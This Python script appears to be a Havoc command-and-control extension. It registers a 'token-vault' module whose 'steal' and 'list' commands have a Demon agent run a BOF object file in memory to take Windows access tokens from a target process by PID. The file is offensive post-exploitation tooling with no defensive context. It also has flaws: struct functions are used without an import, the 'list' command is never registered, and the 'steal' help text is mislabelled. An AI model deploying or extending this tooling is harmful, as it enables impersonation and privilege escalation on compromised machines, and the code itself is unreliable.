from havoc import Demon, RegisterCommand, RegisterModule

BOF_PATH = "./bin/token-vault.x64.o"

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4


def list(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("list")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def steal(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("steal")
    packer.addint(int(args[0]))

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

RegisterModule("token-vault", "just another token vault", "", "[command] (args)", "", "")
RegisterCommand(steal, "token-vault", "steal", "list the available tokens of the token-vault", 0,
                "<pid>", "663")